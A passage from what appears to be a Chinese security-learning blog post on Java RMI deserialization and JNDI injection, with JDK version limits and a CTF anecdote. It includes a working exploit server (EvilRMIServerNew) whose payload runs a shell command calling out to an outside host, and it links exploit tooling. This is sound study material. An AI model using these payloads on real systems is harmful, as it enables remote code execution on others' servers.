+<h3 id="registry攻击client"><a href="#registry攻击client" class="headerlink" title="registry攻击client"></a>registry攻击client</h3><p>同样也能打服务端，但是基本上注册中心和服务端都是一台机子，所以就不多说了。<br>其实从上面也能看出来，只要两个机器远程交互的时候传递了序列化的对象，那接受的机器基本上就没跑的会把序列化的对象给反序列化出来，只要目标机器上确实存在这个链，就能一键打通。<br>使用ysoserial可以生成一个恶意的注册中心，只要服务端调用注册中心的方法，就给你返回一个执行命令的Object给你反序列化</p>
+<h3 id="client攻击server"><a href="#client攻击server" class="headerlink" title="client攻击server"></a>client攻击server</h3><p>服务端对传递过来的参数放进了一个<code>unmarshalValue</code>函数进行处理，该方法在参数不是基本类型的情况下会对传入数据进行readObject，所以客户端提交给服务端的数据里得有一个Object，也就是服务端提供的函数调用中，至少得有一个函数接受的参数是一个Object，<strong>至少得不是一个primitive type才能触发readObject</strong>，才能发一个恶意对象过去进行利用<br>如图<br><img src="/images/JavaRMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8/unmarshalValue.png" alt="unmarshalValue.png"><br>这里可以看到服务端对传过来的类进行了一个类型判断，只要不是primitive type的类就直接进行readObject反序列化，而再来看一下primitive type有哪些<br><img src="/images/JavaRMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8/isPrimitive.png" alt="isPrimitive.png"><br>这意味着string也不是基础类型，服务端如果接受的是string也能打通</p>
+<p>把这个复现一下</p>
+<h4 id="魔改代码"><a href="#魔改代码" class="headerlink" title="魔改代码"></a>魔改代码</h4><p>因为需要调用可序列化对象为参数的函数，所以得把之前的代码加点东西，魔改一下<br>简单起见，给Hello的接口和实现里面加一个接收Object的函数。</p>
+<p><em>即使我们上面说到String类型也能被反序列化，但本地代码调用远程方法的时候肯定还是得按远程方法的参数类型去发送，否则会出现方法hash校验不通过，即使接受String类型参数的远程方法会反序列化我们发过去的参数，但本地仍然无法轻松的违背调用规则发送一个非String的序列化数据，这就需要对Java源码进行一些魔改或者通过debug和注入程序的方式进行魔改。</em></p>
+<p><em>jdk8u242中修改了readObject0方法，专门对String类型做了校验，还整出来了有关readString方法专门去读String，简单的理解就是不能再远程接受参数为String的时候硬传个其他的类型上去了。但是除了String外的非基础类型千千万，这么个过滤真的有用吗？</em></p>
+<p>这里演示的是直接传Object的简单利用</p>
+<pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">// HelloInterface</span>
+<span class="token keyword">public</span> String <span class="token function">sayHelloObj</span><span class="token punctuation">(</span>Object name<span class="token punctuation">)</span> <span class="token keyword">throws</span> RemoteException<span class="token punctuation">;</span>
+<span class="token comment" spellcheck="true">// HelloImpl</span>
+<span class="token keyword">public</span> String <span class="token function">sayHelloObj</span><span class="token punctuation">(</span>Object name<span class="token punctuation">)</span> <span class="token keyword">throws</span> RemoteException <span class="token punctuation">{</span>
+    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Hello "</span> <span class="token operator">+</span> name<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token string">"sayHelloObj"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>然后打一个喜闻乐见的cc反序列化<br>然后cc链的依赖引不进来，又折腾了半天，就是不行，最后把项目重新用maven开了一遍。。。用maven引进来了，然后发现IDEA不知道为什么开始占用一堆端口，把1000-1200中间的几十个端口给占了，然后再改了一下Registry的端口，Client里面调用一下<br>嗯，没打通，用的CC1的链太古老了，打不通我最新版本jdk8，然后换上cc567几个链可以打高版本，成功弹出计算器。</p>
+<p>这里踩了一个小坑，我一开始是直接从rmb神仙的博客里复制粘贴了一个cc5的链，他那里填的命令执行的内容是touch一个文件，而我本地windows肯定不会有touch这个命令，也就出现了报错，但我却发现报错是在client端出现的，而server貌似平稳运行，啥也没说。</p>
+<p>经过各种下断点调试，最后我发现，命令执行确实是在server上执行的，只不过报错也好结果也好都会返回给client，我差点以为是哪里出错了导致实际上命令是在client端执行的，呼应了之前的JRMP Listener无论方法client调用的方法的返回值是什么类型，反正直接返回一个异常类型反序列化打通</p>
+<p>也学会了一些调试的方法，比如什么在方法处下断点，跟着报错的调用栈几十层几十层的进之类的。。。</p>
+<h3 id="server攻击client"><a href="#server攻击client" class="headerlink" title="server攻击client"></a>server攻击client</h3><p>刚才说了，只要信息交换过程中给了序列化数据十有八九就会反序列化，所以当客户端调用服务端方法的时候，同样可以让服务端返回一个Object，只需要让客户端调用一个返回值是Object的方法，返回一个恶意的Object就可以把客户端打穿，因此在你攻击其他人的时候，也有可能反手被其他人攻击</p>
+<h2 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h2><p>JNDI注入的关键是在用户进行远程方法调用时返回的stub是一个reference类型的对象，且用户本地CLASSPATH不存在该类字节码，导致用户需要加载reference类的字节码，直接返回恶意类字节码命令执行</p>
+<h3 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h3><p><del>没什么用的名词介绍环节</del><br>Java Naming and Directory Interface，Java命名和目录接口，通过调用JNDI的API应用程序可以定位资源和其他程序对象，现在JNDI能访问的服务有：JDBC、LDAP、RMI、DNS、NIS、CORBA。</p>
+<p>其提供如下三种服务：<br>Naming Service 命名服务：<br>命名服务将名称和对象进行关联，提供通过名称找到对象的操作，例如：DNS系统将计算机名和IP地址进行关联、文件系统将文件名和文件句柄进行关联等等。</p>
+<p>Directory Service 目录服务：<br>目录服务是命名服务的扩展，除了提供名称和对象的关联，还允许对象具有属性。目录服务中的对象称之为目录对象。目录服务提供创建、添加、删除目录对象以及修改目录对象属性等操作。</p>
+<p>Reference 引用：<br>在一些命名服务系统中，系统并不是直接将对象存储在系统中，而是保持对象的引用。引用包含了如何访问实际对象的信息。</p>
+<h3 id="RMI绑定远程对象"><a href="#RMI绑定远程对象" class="headerlink" title="RMI绑定远程对象"></a>RMI绑定远程对象</h3><p>通过在注册中心上绑定一个恶意reference类对象，将恶意对象的字节码放在HTTP&#x2F;FTP&#x2F;SMB服务器上，需要客户端在加载reference类时在本地无法找到，通过codebase远程加载恶意类，在类实例化时触发payload<br>需要满足如下利用条件</p>
+<ul>
+<li>安装并配置了SecurityManager</li>
+<li>java.rmi.server.useCodebaseOnly&#x3D;false，当useCodebasOnly为true时只允许加载信任codebase，不对未知codebase动态加载类，Java从7u21、6u45开始默认该属性为true<br>泛用性很低</li>
+</ul>
+<h3 id="JNDI-Reference"><a href="#JNDI-Reference" class="headerlink" title="JNDI Reference"></a>JNDI Reference</h3><p>RMI服务端在进行bind操作的时候，可以绑定一个JNDI Naming Reference（感觉类似于之前的RMI绑定远程对象），当客户端申请Stub的时候，返回的就是一个引用（Reference）对象，该引用对象的加载与RMI Class Loading的机制不同，因此可以绕过<code>java.rmi.server.useCodebaseOnly</code>的限制，但同样有相应的利用条件，需<code>com.sun.jndi.rmi.object.trustURLCodebase=true&amp;com.sun.jndi.cosnaming.object.trustURLCodebase=true</code>，其设置为false时限制了从远程Codebase加载Reference工厂类，JDK 6u132, JDK 7u122, JDK 8u113开始将其默认设置为false</p>
+<p>Reference对象没有实现Remote接口也不继承UnicastRemoteObject类，就不能绑定到注册中心上，需要用<code>ReferenceWrapper</code>这个包装类对其进行包装</p>
+<pre class=" language-java"><code class="language-java">Reference reference <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Reference</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">,</span> <span class="token string">"http://localhost/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ReferenceWrapper wrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>reference<span class="token punctuation">)</span><span class="token punctuation">;</span>
+registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">,</span> wrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<p>当客户端在lookup之类操作问注册中心要Stub的时候，拿到的是引用对象，经过如下调用栈（复制粘贴先知的）</p>
+<pre><code>getObjectFactoryFromReference:163, NamingManager (javax.naming.spi)
+getObjectInstance:319, NamingManager (javax.naming.spi)
+decodeObject:456, RegistryContext (com.sun.jndi.rmi.registry)
+lookup:120, RegistryContext (com.sun.jndi.rmi.registry)
+lookup:203, GenericURLContext (com.sun.jndi.toolkit.url)
+lookup:411, InitialContext (javax.naming)
+main:7, JNDI_Test (demo)
+</code></pre>
+<p>在<code>getObjectFactoryFromReference</code>最后是这么一段</p>
+<pre class=" language-java"><code class="language-java">String codebase<span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>clas <span class="token operator">==</span> null <span class="token operator">&amp;&amp;</span>
+            <span class="token punctuation">(</span>codebase <span class="token operator">=</span> ref<span class="token punctuation">.</span><span class="token function">getFactoryClassLocation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+            clas <span class="token operator">=</span> helper<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>factoryName<span class="token punctuation">,</span> codebase<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ClassNotFoundException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">return</span> <span class="token punctuation">(</span>clas <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token punctuation">(</span>ObjectFactory<span class="token punctuation">)</span> clas<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">:</span> null<span class="token punctuation">;</span>
+</code></pre>
+<p>从codebase加载远程类字节码，最后返回一个clas.newInstance，这里就触发了我们预先在恶意类中埋下的雷，实现命令执行</p>
+<h3 id="JNDI-Reference-LDAP"><a href="#JNDI-Reference-LDAP" class="headerlink" title="JNDI Reference+LDAP"></a>JNDI Reference+LDAP</h3><p>绑定的东西改成一个LDAP服务，LDAP服务同样可以返回一个JNDI Reference对象，这时通过LDAP远程加载，不受上面这两个<code>com.sun.jndi.rmi.object.trustURLCodebase&amp;com.sun.jndi.cosnaming.object.trustURLCodebase</code>属性的控制，同样也被打了补丁<br>在在Oracle JDK 11.0.1、8u191、7u201、6u211之后，<code>com.sun.jndi.ldap.object.trustURLCodebase</code>属性的默认值被调整为false</p>
+<h3 id="利用本地链进行执行"><a href="#利用本地链进行执行" class="headerlink" title="利用本地链进行执行"></a>利用本地链进行执行</h3><p>同样有两种攻击方式，一种是利用本地Class作为Reference Factory，第二种是利用本地存在的反序列化链直接进行RCE</p>
+<h4 id="1"><a href="#1" class="headerlink" title="#1"></a>#1</h4><p>本地class作为Reference Factory，这里使用的是<code>org.apache.naming.factory.BeanFactory</code><br>利用条件为</p>
+<blockquote>
+<p>implement “javax.naming.spi.ObjectFactory” and have at least a “getObjectInstance” method</p>
+</blockquote>
+<p>这个BeanFactory可以创建任意bean的实例并调用其setter方法（但是我还没有很理解bean是一个什么概念。。。），也许就是实例化任意类？说起来setter调用就会想起来fastJson，但是fastjson的常见利用链，好像就一个JDNI注入是用setter的，剩下的都是用getter，而这里本身就是通过JDNI注入才走到这步的，好像gadget并不互通。。。</p>
+<p>构造的bean需要满足如下条件</p>
+<blockquote>
+<p>The target class should have a public no-argument constructor and public setters with only one “String” parameter. In fact, these setters may not necessarily start from ‘set..’ as “BeanFactory” contains some logic surrounding how we can specify an arbitrary setter name for any parameter.</p>
+</blockquote>
+<p>这个BeanFactory有一个奇怪的表现，他会读取ref对象中的<code>forceString</code>属性，如果这个属性的值为<code>a=b</code>，那么BeanFactory就会把函数b当做a属性的setter</p>
+<pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/* Look for properties with explicitly configured setter */</span>
+RefAddr ra <span class="token operator">=</span> ref<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+Map forced <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+String value<span class="token punctuation">;</span>
+ 
+<span class="token keyword">if</span> <span class="token punctuation">(</span>ra <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    value <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>ra<span class="token punctuation">.</span><span class="token function">getContent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    Class <span class="token class-name">paramTypes</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    paramTypes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>
+    String setterName<span class="token punctuation">;</span>
+    <span class="token keyword">int</span> index<span class="token punctuation">;</span>
+ 
+    <span class="token comment" spellcheck="true">/* Items are given as comma separated list */</span>
+    <span class="token keyword">for</span> <span class="token punctuation">(</span>String param<span class="token operator">:</span> value<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        param <span class="token operator">=</span> param<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment" spellcheck="true">/* A single item can either be of the form name=method
+         * or just a property name (and we will use a standard
+         * setter) */</span>
+        index <span class="token operator">=</span> param<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>index <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            setterName <span class="token operator">=</span> param<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>index <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            param <span class="token operator">=</span> param<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> index<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+            setterName <span class="token operator">=</span> <span class="token string">"set"</span> <span class="token operator">+</span>
+                         param<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span>Locale<span class="token punctuation">.</span>ENGLISH<span class="token punctuation">)</span> <span class="token operator">+</span>
+                         param<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+</code></pre>
+<p>也就是说，我们可以使用BeanFactory调用任意一个拥有public无参构造方法类的以一个String为参数的方法</p>
+<p>这里使用的是<code>javax.el.ELProcessor</code>这个类，这个类（好像还蛮经典的）可以使用eval方法执行java代码，且均符合上述条件</p>
+<p>原作者给出的poc如下</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>*<span class="token punctuation">;</span>
+<span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>*<span class="token punctuation">;</span>
+<span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>*<span class="token punctuation">;</span>
+<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>ResourceRef<span class="token punctuation">;</span>
+ 
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">EvilRMIServerNew</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>
+        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Creating evil RMI registry on port 1097"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Registry registry <span class="token operator">=</span> LocateRegistry<span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">1097</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ 
+        <span class="token comment" spellcheck="true">//prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory</span>
+        ResourceRef ref <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">(</span><span class="token string">"javax.el.ELProcessor"</span><span class="token punctuation">,</span> null<span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span><span class="token string">"org.apache.naming.factory.BeanFactory"</span><span class="token punctuation">,</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment" spellcheck="true">//redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code</span>
+        ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">,</span> <span class="token string">"x=eval"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment" spellcheck="true">//expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to cmd.exe if you target windows</span>
+        ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"x"</span><span class="token punctuation">,</span> <span class="token string">"\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','nslookup jndi.s.artsploit.com']).start()\")"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ 
+        ReferenceWrapper referenceWrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>ReferenceWrapper</span><span class="token punctuation">(</span>ref<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"Object"</span><span class="token punctuation">,</span> referenceWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>再另一篇神仙的文章中，有说到在tomcat7下，没有javax.el.ELProcessor，需要额外引入，而tomcat8.5后则自带了，且tomcat自带的包和javax.el的ELProcessor包名相同，完全限定名均为<code>javax.el.ELProcessor</code>，并且似乎javax.el下的ELProcesser好像还没法执行上述payload<br>而tomcat下自带的可以执行<br>分别对应pom中这几个依赖<br>tomcat</p>
+<pre class=" language-xml"><code class="language-xml">        <span class="token comment" spellcheck="true">&lt;!-- https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-catalina --></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.tomcat<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>tomcat-catalina<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>8.5.34<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>
+        <span class="token comment" spellcheck="true">&lt;!-- https://mvnrepository.com/artifact/org.apache.el/com.springsource.org.apache.el --></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.el<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>com.springsource.org.apache.el<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>7.0.26<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>
+</code></pre>
+<p>javax</p>
+<pre class=" language-xml"><code class="language-xml">    <span class="token comment" spellcheck="true">&lt;!-- https://mvnrepository.com/artifact/javax.el/javax.el-api --></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>javax.el<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>javax.el-api<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.0.1-b06<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>
+
+    <span class="token comment" spellcheck="true">&lt;!-- https://mvnrepository.com/artifact/com.sun.el/el-ri --></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.sun.el<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>el-ri<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
+</code></pre>
+<p>这里有一个坑，IDEA在我输入javax.el的时候提示我导入Java EE 6（虽然我不知道这个是什么），但是这个玩意和之后maven导入的依赖应该是有冲突的，会超级报错。。。</p>
+<p>试了一下tomcat10，好像又把这个依赖给去掉了，改成了jakarta.el，看来利用范围也比较有限</p>
+<h4 id="2"><a href="#2" class="headerlink" title="#2"></a>#2</h4><p>在2021天翼杯这个比赛中见识到了（说起来应该不难，但是我真的不太会java）<br>用JNDI去连LDAP服务，而LDAP服务存的java对象，除了能Reference对象外，也可以存序列化的对象，只要在返回的对象中存在javaSerializedData这个属性，客户端就会对该属性进行反序列化，通过反序列化用户本地存在的链子进行命令执行</p>
+<p>这次的比赛就是这样，给了一个jackson的反序列化，同时还安装了<code>ch.qos.logback</code>和<code>Common-Collection3</code>依赖。我由于完全没有积累，并不知道这个类可以进行JNDI注入，所以只搜到了一个配合h2库进行数据库操作RCE的攻击方式，而题目环境中并未含有此依赖，无法攻击</p>
+<p>但是<code>ch.qos.logback</code>这个库还有一个JNDI功能，利用此功能可以进行命令执行<br>攻击方式较为简单，直接生成cc链反序列化的类字节码，放到LDAP服务中返回的<code>javaSerializedData</code>属性中即可<br>至于起一个LDAP服务的话，从网上抄一段代码<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/kxcode/JNDI-Exploit-Bypass-Demo">JNDI-Exploit-Bypass-Demo</a><br>还有一个神仙写的基于yso的ysomap工具也能用，做的好高级，和msf的使用方式比较像，就是这个cc8和9是什么东西？好像是把CC再排列组合了一下？功能还蛮多，慢慢看都有啥好玩的<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/wh1t3p1g/ysomap/releases/tag/0.0.1-RLEASE">YSOMAP</a></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.0kami.cn/2020/02/06/java/rmi-registry-security-problem/">浅谈Java RMI Registry安全问题</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://xz.aliyun.com/t/8706">JAVA RMI 反序列化攻击 &amp; JEP290 Bypass分析</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://xz.aliyun.com/t/6660">RMI反序列化</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://xz.aliyun.com/t/8214">JNDI注入学习</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://paper.seebug.org/942/">如何绕过高版本JDK的限制进行JNDI注入利用</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.xmanblog.net/java-rmi-rce/">深入理解Java RMI反序列化漏洞</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/nice0e3/p/13927460.html">Java安全之RMI反序列化</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/">BlackHat 2016 回顾之 JNDI 注入简单解析</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://zhuanlan.zhihu.com/p/347364636">Java安全之ysoserial-JRMP模块分析（一）</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/033462472c28">openjdk8u242有关readObject的更新</a></p>
+<p>两篇关于JNDI注入BeanFactory利用<br><a target="_blank" rel="external nofollow noopener noreferrer" href="http://www.yulegeyu.com/2019/01/11/Exploitng-JNDI-Injection-In-Java/">Exploiting JNDI Injection In Java</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java">Exploiting JNDI Injections in Java</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Java/" rel="tag"># Java</a>
+              <a href="/tags/RMI/" rel="tag"># RMI</a>
+              <a href="/tags/JNDI/" rel="tag"># JNDI</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/Switch%E8%87%AA%E5%BB%BANAT%E4%BC%98%E5%8C%96%E6%8C%87%E5%8C%97.html" rel="prev" title="Switch自建NAT优化指北">
+      <i class="fa fa-chevron-left"></i> Switch自建NAT优化指北
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/%E4%BB%8EByteCTF%E5%88%B0bypass_disable_function.html" rel="next" title="从ByteCTF到bypass_disable_function">
+      从ByteCTF到bypass_disable_function <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
